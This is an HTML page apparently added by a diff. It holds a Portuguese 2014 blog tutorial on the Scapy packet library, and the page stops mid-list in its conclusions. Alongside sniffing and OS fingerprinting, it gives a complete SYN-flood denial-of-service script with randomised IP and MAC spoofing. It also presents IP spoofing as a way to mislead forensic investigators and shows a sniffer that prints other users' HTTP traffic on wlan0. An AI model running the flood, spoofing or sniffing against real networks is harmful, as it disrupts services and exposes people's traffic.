@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Scapy Manipulando de Pacotes na Rede</title>
+	
+	<meta name="author" content="mh4x0f">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/mh4x0f">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/mh4x0f">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:mh4root@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" />
+				
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" style="width:112px;height:112px;" />
+	</a>
+	<h3 class="title">
+        <a href="/"></a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	One 0x41414141 worth a thousand words
+</div>
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/mh4x0f">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/mh4x0f">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:mh4root@gmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<form class="col-lg-12" action="http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity" method="post" target="popupwindow" onsubmit="window.open('http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity', 'popupwindow', 'scrollbars=yes,width=250,height=220');return true" >
+			<div class="input-group" style="width:240px;text-align:center;margin:0 auto;">
+			<input type="hidden" value="chmodsecurity" name="uri" >
+		  <input type="hidden" name="loc" value="pt_BR">
+		  <input  id="input-rss"  style="width:160px;text-align:center;" placeholder="Digite  seu e-mail" class="form-control input-lg" type="text" name="email">
+		  <span class="input-group-btn"><button id="btn-assinar" class="btn btn-lg btn-primary"  type="submit" value=" ASSINAR ">Assinar</button></span>
+	      </div>
+		</form>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>Scapy Manipulando de Pacotes na Rede </h1>
+</div>
+	
+<article>
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   June 
+	   16th,
+	   
+	   2014
+	 </span>
+	  <div class="article_body">
+	  <p>Há um tempo estava pensando em fazer um vídeo no meu canal sobre <a>scapy</a> em python, mas fiquei sem tempo 
+pra tu é meio complicado gravar, até porque youtube ninguém quer mais saber como funciona quer apenas fazer
+sem saber o fundamento da parada, a ideia é acabar com vídeo e começar a escrever para quem realmente curti security, e quer aprender coisas novas. Voltando ao artigo, mexer com redes em qualquer outra linguagem é chato pra caray. fazer um sniffer de pacotes em C, da mais ou menos umas 200 linhas no mínimo, mas com o módulo <a>scapy</a> isso fica muito simples de implementar até fica divertido. tipo ta em uma rede wifi, ai abre o python e monta rapidinho o sniffer de rede que mostra quais sites está sendo acesso e de qual IP, é simples de fazer isso com python.</p>
+<h3>O que é Scapy ?</h3>
+<p>Scapy é Ferramenta de manipulação de pacotes de rede  que atua na Camadas 2 e 3  Camada de rede e a  Camada de enlace de dados,vai ai uma lista de protocolos suportados:</p>
+<pre class="code">
+Protocolos suportados:
+? Ethernet
+? 802.1Q
+? 802.11
+? 802.3
+? LLC
+? EAPOL
+? EAP
+? BOOTP
+? PPP Link Layer
+? IP
+? TCP
+? ICMP
+? ARP
+? STP
+? UDP
+? DNS
+? Protocolos em desenvolvimento
+?IPv6, VRRP, BGP, OSPF
+</pre>
+<p><br /></p>
+<p>com o scapy podemos Substitui as ferramentas ttlscan, nmap, 
+hping,queso, p0f, xprobe, arping, arp-sk, 
+arpspoof, rewalk, irpas entre outras.</p>
+<p>como falei sobre como fazer um sniffer é simples follow o seguinte código  sniff(filter="tcp and host 192.168.0.128 and port 80", count=10) depois &gt;&gt;&gt; _.show() como está em baixo.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s">&quot;tcp and host 192.168.0.128 and port 80&quot;</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="n">Sniffed</span><span class="p">:</span> <span class="n">UDP</span><span class="p">:</span><span class="mi">0</span> <span class="n">TCP</span><span class="p">:</span><span class="mi">10</span> <span class="n">ICMP</span><span class="p">:</span><span class="mi">0</span> <span class="n">Other</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">_</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
+<span class="mo">0000</span> <span class="n">Ether</span> <span class="o">/</span> <span class="n">IP</span> <span class="o">/</span> <span class="n">TCP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.128</span><span class="p">:</span><span class="mi">32770</span> <span class="o">&gt;</span> <span class="mf">207.46</span><span class="o">.</span><span class="mf">28.78</span><span class="p">:</span><span class="n">http</span> <span class="n">PA</span> <span class="o">/</span> <span class="n">Raw</span>
+<span class="mo">0001</span> <span class="n">Ether</span> <span class="o">/</span> <span class="n">IP</span> <span class="o">/</span> <span class="n">TCP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.128</span><span class="p">:</span><span class="mi">33195</span> <span class="o">&gt;</span> <span class="mf">207.46</span><span class="o">.</span><span class="mf">28.78</span><span class="p">:</span><span class="n">http</span> <span class="n">PA</span> <span class="o">/</span> <span class="n">Raw</span>
+<span class="mo">0002</span> <span class="n">Ether</span> <span class="o">/</span> <span class="n">IP</span> <span class="o">/</span> <span class="n">TCP</span> <span class="mf">207.46</span><span class="o">.</span><span class="mf">28.78</span><span class="p">:</span><span class="n">http</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.128</span><span class="p">:</span><span class="mi">32770</span> <span class="n">PA</span> <span class="o">/</span> <span class="n">Raw</span>
+<span class="mo">0003</span> <span class="n">Ether</span> <span class="o">/</span> <span class="n">IP</span> <span class="o">/</span> <span class="n">TCP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.128</span><span class="p">:</span><span class="mi">32770</span> <span class="o">&gt;</span> <span class="mf">207.46</span><span class="o">.</span><span class="mf">28.78</span><span class="p">:</span><span class="n">http</span> <span class="n">A</span>
+<span class="mo">0004</span> <span class="n">Ether</span> <span class="o">/</span> <span class="n">IP</span> <span class="o">/</span> <span class="n">TCP</span> <span class="mf">207.46</span><span class="o">.</span><span class="mf">28.78</span><span class="p">:</span><span class="n">http</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.128</span><span class="p">:</span><span class="mi">33195</span> <span class="n">PA</span> <span class="o">/</span> <span class="n">Raw</span>
+<span class="mo">0005</span> <span class="n">Ether</span> <span class="o">/</span> <span class="n">IP</span> <span class="o">/</span> <span class="n">TCP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.128</span><span class="p">:</span><span class="mi">33195</span> <span class="o">&gt;</span> <span class="mf">207.46</span><span class="o">.</span><span class="mf">28.78</span><span class="p">:</span><span class="n">http</span> <span class="n">A</span>
+<span class="mo">0006</span> <span class="n">Ether</span> <span class="o">/</span> <span class="n">IP</span> <span class="o">/</span> <span class="n">TCP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.128</span><span class="p">:</span><span class="mi">33194</span> <span class="o">&gt;</span> <span class="mf">207.46</span><span class="o">.</span><span class="mf">28.78</span><span class="p">:</span><span class="n">http</span> <span class="n">PA</span> <span class="o">/</span> <span class="n">Raw</span>
+<span class="mo">0007</span> <span class="n">Ether</span> <span class="o">/</span> <span class="n">IP</span> <span class="o">/</span> <span class="n">TCP</span> <span class="mf">207.46</span><span class="o">.</span><span class="mf">28.78</span><span class="p">:</span><span class="n">http</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.128</span><span class="p">:</span><span class="mi">33194</span> <span class="n">PA</span> <span class="o">/</span> <span class="n">Raw</span>
+<span class="mo">000</span><span class="mi">8</span> <span class="n">Ether</span> <span class="o">/</span> <span class="n">IP</span> <span class="o">/</span> <span class="n">TCP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.128</span><span class="p">:</span><span class="mi">33194</span> <span class="o">&gt;</span> <span class="mf">207.46</span><span class="o">.</span><span class="mf">28.78</span><span class="p">:</span><span class="n">http</span> <span class="n">A</span>
+<span class="mo">000</span><span class="mi">9</span> <span class="n">Ether</span> <span class="o">/</span> <span class="n">IP</span> <span class="o">/</span> <span class="n">TCP</span> <span class="mf">207.46</span><span class="o">.</span><span class="mf">28.78</span><span class="p">:</span><span class="n">http</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.128</span><span class="p">:</span><span class="mi">33194</span> <span class="n">PA</span> <span class="o">/</span> <span class="n">Raw</span></code></pre></div>
+
+<p>assim podemos monitorar todos os pacotes TCP que vem do host 192.168.0.128, é um pequeno exemplo do que podemos fazer coma ajuda do scapy. para iniciar o scapy no linux é só digitar:<a>scapy</a> no terminal, isso se o python tive instalado lógico, vamos ver algumas funções que podemos usar.&lt;/p&gt;</p>
+<pre class="code">
+Funções de baixo nível:
+? sr() - Enviar e receber pacotes na camada 3(rede);
+? sr1() - Enviar pacotes na camada de rede e receber apenas a primeira resposta 
+da rede;
+? srp() - Enviar e receber pacotes na camada de enlace;
+? srp1() - Enviar e receber pacotes na camada de enlace e receber apenas a 
+primeira resposta;
+? srloop() - Enviar pacotes na camada 3 em um loop e imprimir as saídas;
+? srploop() - Enviar pacotes na camada 2 em um loop e imprimir as saídas;
+? sniff() - Capturar pacotes;
+? send() - Enviar pacotes na camada 3;
+? sendp() - Enviar pacotes na camada 2;
+? ls() - Mostra a lista de camadas suportadas pelo Scapy;
+? ls(x) - Mostra as características de uma determinada camada x;
+? lsc() - Mostra todas as funções presentes no Scapy;
+? lsc(x) - Mostra os parâmetros da função x;
+? conf - Mostra todos os parâmetros iniciais predefinidos.
+</pre>
+<p><br /></p>
+<pre>
+Funções para criação de pacotes:
+? IP()
+? ICMP()
+? TCP()
+? Ether() 
+? NET()
+
+Métodos:
+? summary() - mostra a lista de características de cada pacote; 
+? nsummary() - mesma função do anterior, só que informa-se o 
+número do pacote; 
+? conversations() - imprime o gráfico da conversação;
+? show() - mostra a representação desejada; 
+? filter() - retorna uma lista de pacotes filtrados por uma função 
+lambda;
+? plot() - plota uma função lambda para a lista de pacotes; 
+? make_table() - mostra uma tabela de acordo com uma função 
+lambda.
+</pre>
+<p><br /></p>
+<p>Vamos começar a brincar um pouco com scapy. agora nós vamos criar um simples Network descovery, vamos descobrir 
+qual sistema operacional um IP da rede está sando se é Windows ou Linux :D.</p>
+<p>primeiro vamos dar uma olhada no nosso pequeno código:</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#! /usr/bin/env python</span>
+<span class="c">#coding: utf-8</span>
+<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">ip_alvo</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">&quot;Digite O IP:&quot;</span><span class="p">)</span>
+
+<span class="n">ip</span> <span class="o">=</span> <span class="n">IP</span><span class="p">()</span>
+<span class="n">ping</span> <span class="o">=</span> <span class="n">ICMP</span><span class="p">()</span>
+<span class="n">ip</span><span class="o">.</span><span class="n">dst</span> <span class="o">=</span> <span class="n">ip_alvo</span>
+<span class="n">enviando</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">ip</span><span class="o">/</span><span class="n">ping</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">enviando</span><span class="o">.</span><span class="n">ttl</span> <span class="o">&lt;</span> <span class="mi">65</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">&quot;IP:</span><span class="si">%s</span><span class="s">  Sistema Operacinal=  Linux&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">ip_alvo</span><span class="p">))</span>
+
+<span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">&quot;IP:</span><span class="si">%s</span><span class="s">  Sistema Operacinal = Windows&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">ip_alvo</span><span class="p">))</span></code></pre></div>
+
+<p><a>Video Demostrativo :D</a></p>
+<iframe src="http://showterm.io/a71b92942433d6049abfc" width="800" height="400"></iframe>
+<p><br /></p>
+<p>Primeiro nós importamos tudo do módulo scapy, agora precisamos definir algumas variáveis uma como IP() para criar o pacote, e depois criamos outra 'ping' como ICMP, que é um protocolo mensagem ,(wiki) 'ICMP, sigla para o inglês Internet Control Message Protocol, é um protocolo integrante do Protocolo IP, definido pelo RFC 792, e utilizado para fornecer relatórios de erros à fonte original. Qualquer computador que utilize IP precisa aceitar as mensagens ICMP e alterar o seu comportamento de acordo com o erro relatado. Os gateways devem estar programados para enviar mensagens ICMP quando receberem datagramas que provoquem algum erro.'</p>
+<p>Caso você teste com algum servidor e não der certo, não é problema do script e sim do servidor que pode está bloqueando requisições do site ICMP, com Iptables :D. DROP.</p>
+<pre class="code">
+ip.dst = ip_alvo
+enviando = sr1(ip/ping)
+</pre>
+<p><br /></p>
+<p>Agora definimos o nosso Ip destino, ou seja, o endereço que vai ser empacotado, depois enviando o pacote e armazenamos o conteúdo do pacote em uma viável 'enviando'.</p>
+<pre class="code">
+if enviando.ttl &lt; 65:
+        print("IP:%s  Sistema Operacinal=  Linux"%(ip_alvo))
+
+else:
+        print("IP:%s  Sistema Operacinal = Windows"%(ip_alvo))
+</pre>
+
+<p> HAHAHA agora, tudo fica claro o linux é windows tem TTL(Time to Live) diferentes o windows simples acima de 65 e o linux sempre abaixo.TTL é um acrónimo do inglês Time to Live, que significa o número de saltos entre máquinas que os pacotes podem demorar numa rede de computadores antes de serem descartados (máximo de 255).
+</p>
+<p>Vamos testar agora né, pra ver se funciona</p>
+<pre>
+root@ChmoSec:~/Desktop# nano script.py
+root@ChmoSec:~/Desktop# python script.py 
+WARNING: No route found for IPv6 destination :: (no default route?)
+Digite O IP:192.168.1.100
+Begin emission:
+..*Finished to send 1 packets.
+
+Received 3 packets, got 1 answers, remaining 0 packets
+IP:192.168.1.100  Sistema Operacinal = Windows
+</pre>
+<p>É simples e prático, agora vamos ver o conteúdo do pacote, é isso mesmo podemos ver o conteúdo do pacotes.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">###[ IP ]###</span>
+  <span class="n">version</span>   <span class="o">=</span> <span class="il">4L</span>
+  <span class="n">ihl</span>       <span class="o">=</span> <span class="il">5L</span>
+  <span class="n">tos</span>       <span class="o">=</span> <span class="mh">0x0</span>
+  <span class="nb">len</span>       <span class="o">=</span> <span class="mi">28</span>
+  <span class="nb">id</span>        <span class="o">=</span> <span class="mi">6334</span>
+  <span class="n">flags</span>     <span class="o">=</span> 
+  <span class="n">frag</span>      <span class="o">=</span> <span class="il">0L</span>
+  <span class="n">ttl</span>       <span class="o">=</span> <span class="mi">128</span>
+  <span class="n">proto</span>     <span class="o">=</span> <span class="n">icmp</span>
+  <span class="n">chksum</span>    <span class="o">=</span> <span class="mh">0x9e06</span>
+  <span class="n">src</span>       <span class="o">=</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span>
+  <span class="n">dst</span>       <span class="o">=</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.104</span>
+  \<span class="n">options</span>   \
+<span class="c">###[ ICMP ]###</span>
+     <span class="nb">type</span>      <span class="o">=</span> <span class="n">echo</span><span class="o">-</span><span class="n">reply</span>
+     <span class="n">code</span>      <span class="o">=</span> <span class="mi">0</span>
+     <span class="n">chksum</span>    <span class="o">=</span> <span class="mh">0xffff</span>
+     <span class="nb">id</span>        <span class="o">=</span> <span class="mh">0x0</span>
+     <span class="n">seq</span>       <span class="o">=</span> <span class="mh">0x0</span>
+<span class="c">###[ Padding ]###</span>
+        <span class="n">load</span>      <span class="o">=</span> <span class="s">&#39;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#39;</span>
+<span class="bp">None</span></code></pre></div>
+
+<p>Olha que coisa linda,se você usar no interpretador isso vai está tudo colorido, podemos ver todo conteúdo do pacote, de você quiser que apareça é só colocar no final do código <a>print enviando.show()</a>, e verá como mostrei, um detalhe ta vendo o ttl = 128, podemos setar todos os atributos tanto do protocolo IP() como ICMP() usando a variável do tipo que nós definimos, tipo <a>ip.src = "167.178.1.100"</a> isso vai fazer um IP spoof, se um forense da vida procurar quem foi que enviou esse requisição vera o ip '167.178.1.100'   </p>
+<p>Espero que você tenha entendido :D, agora vamos avançar vou mostrar um script (Denial of Service),afetar uns dos 3 pilares de segurança da informação, que é a <a>disponibilidade</a> All right! vamos nessa let's go. </p>
+<p><a>&lt;h3&gt; DOS(Denial of Service com scapy&lt;/h3&gt;</a></p>
+<p>Mandar pacotes para algum servidor constantemente pode deixa-lo indisponível temporariamente uma das formas de fazer um ataque, nesse se veio aqui para aprender a fazer DOS, é melhor pesquisar sobre T50, ela faz isso como nenhuma outra tool disponível :D, o lance aqui é aprendizado. tenho um projeto desse tipo na verdade fiz só porque não tinha nada pra fazer e porque tava em um lugar publico brincando com python :D . https://github.com/msfcd3r/Syn-flood.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
+<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">randint</span>
+<span class="c">#by Mhracos Nesster [Mh4]</span>
+<span class="c">#Syn flood com scapy python </span>
+<span class="c"># spoof MAC and IP</span>
+<span class="c"># simples e facil  </span>
+<span class="k">class</span> <span class="nc">synflood</span><span class="p">:</span>
+	<span class="k">global</span> <span class="n">target</span><span class="p">,</span><span class="n">porta</span>
+	<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">target</span><span class="p">,</span><span class="n">porta</span><span class="p">):</span>
+		<span class="n">ip</span> <span class="o">=</span> <span class="n">IP</span><span class="p">()</span>
+		<span class="c"># spoof IP com randint </span>
+		<span class="n">ip</span><span class="o">.</span><span class="n">src</span> <span class="o">=</span> <span class="s">&quot;</span><span class="si">%i</span><span class="s">.</span><span class="si">%i</span><span class="s">.</span><span class="si">%i</span><span class="s">.</span><span class="si">%i</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">),</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">),</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">),</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">))</span>
+		<span class="c"># IP targe</span>
+		<span class="n">ip</span><span class="o">.</span><span class="n">dst</span> <span class="o">=</span> <span class="n">target</span>
+		<span class="n">tcp</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">()</span>
+		<span class="c"># range porta</span>
+		<span class="n">tcp</span><span class="o">.</span><span class="n">sport</span> <span class="o">=</span> <span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">65535</span><span class="p">)</span>
+		<span class="c">#porta flood</span>
+		<span class="n">tcp</span><span class="o">.</span><span class="n">dport</span> <span class="o">=</span> <span class="n">porta</span>
+		<span class="c"># SYN flood ataque</span>
+		<span class="n">tcp</span><span class="o">.</span><span class="n">flags</span> <span class="o">=</span> <span class="s">&quot;S&quot;</span>
+		<span class="c">#compilando packet</span>
+		<span class="n">send</span><span class="p">(</span><span class="n">ip</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">RandMAC</span><span class="p">(),</span><span class="n">dst</span><span class="o">=</span><span class="s">&quot;ff:ff:ff:ff:ff:ff&quot;</span><span class="p">),</span> <span class="n">loop</span><span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+	<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">&quot;[*] Execute como ROOT!&quot;</span><span class="p">)</span>
+		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">&quot;&quot;&quot;                 </span>
+<span class="s">                     \:.|`._</span>
+<span class="s">                  /\/;.:&#39;:::;;;._</span>
+<span class="s">                 &lt;  .&#39;     &#39;:::;(</span>
+<span class="s">                  &lt; &#39; _      &#39;::;&gt;</span>
+<span class="s">                   \ (9)  _  :::;(</span>
+<span class="s">                   |     / \  \:;`&gt;</span>
+<span class="s">                   |    /  |  //:;(</span>
+<span class="s">                   |   (  &lt;=-  .::;&gt;</span>
+<span class="s">                   (  a) )=-  .::;( Mh4</span>
+<span class="s">                    &#39;-&#39; &lt;=- _.::;&gt;&quot;&quot;&quot;</span><span class="p">)</span>
+		<span class="k">print</span> <span class="s">&quot;Usage: </span><span class="si">%s</span><span class="s"> &lt;Target IP&gt; &lt;Port&gt; &lt;interface&gt; &lt;mac-spoof&gt;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">&quot;python </span><span class="si">%s</span><span class="s"> 192.168.1.100 80 eth0 11:22:33:44:55:66&quot;</span><span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+	<span class="n">porta</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+	<span class="n">interface</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+	<span class="n">MAC</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+	<span class="n">system</span><span class="p">(</span><span class="s">&quot;ip route&quot;</span><span class="p">)</span>
+	<span class="n">system</span><span class="p">(</span><span class="s">&quot; ifconfig </span><span class="si">%s</span><span class="s"> hw ether </span><span class="si">%s</span><span class="s">&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">interface</span><span class="p">,</span><span class="n">MAC</span><span class="p">))</span>
+	<span class="n">start</span> <span class="o">=</span><span class="n">synflood</span><span class="p">()</span>
+	<span class="n">start</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">porta</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
+	<span class="n">main</span><span class="p">()</span></code></pre></div>
+
+<p>o ataque DOS se resume ficar enviando uma grande quantidade de pacotes para o servidor, vamos construir um sniffer de sites que estão acessando, é simples também da pra fazer em qualquer lugar, a lógica segue a mesma. Agora um pequeno sniffer HTTP :D </p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
+
+<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">scapy.error</span> <span class="kn">import</span> <span class="n">Scapy_Exception</span>
+
+<span class="n">m_iface</span><span class="o">=</span><span class="s">&quot;wlan0&quot;</span>
+<span class="n">filter_message</span><span class="o">=</span><span class="s">&quot;http&quot;</span>
+<span class="n">count</span><span class="o">=</span><span class="mi">0</span>
+
+<span class="k">def</span> <span class="nf">pktTCP</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
+        <span class="k">global</span> <span class="n">count</span>
+        <span class="k">if</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="o">.</span><span class="n">getlayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span><span class="o">.</span><span class="n">dport</span> <span class="o">==</span> <span class="mi">80</span> <span class="ow">and</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">):</span>
+                <span class="n">count</span><span class="o">=</span><span class="n">count</span><span class="o">+</span><span class="mi">1</span>
+                <span class="k">print</span> <span class="n">pkt</span><span class="o">.</span><span class="n">getlayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">)</span><span class="o">.</span><span class="n">load</span>
+
+<span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="n">m_iface</span><span class="p">,</span><span class="n">prn</span><span class="o">=</span><span class="n">pktTCP</span><span class="p">)</span></code></pre></div>
+
+<p> Veja a lógica é só um pouco mais de código, isso é tudo, pesquise mais sobre scapy tem muita coisa que da pra fazer. abra o python e brinque :D. 
+<a><h3>Conclusões</h3></a>
+<pre>Scapy ainda tem algumas limitações, 
+como:
+? Manipulação de pequena quantidade de 
+pacotes;
+? Não faz o tratamento da informação recolhida, 
+ou seja, fica a cargo do usuário tal ato;
+? Ainda não pode substituir algumas ferramentas 
+presentes no mercado( Libnet, Ngrep) pela sua 
+principal característica, de criar estímulos e 
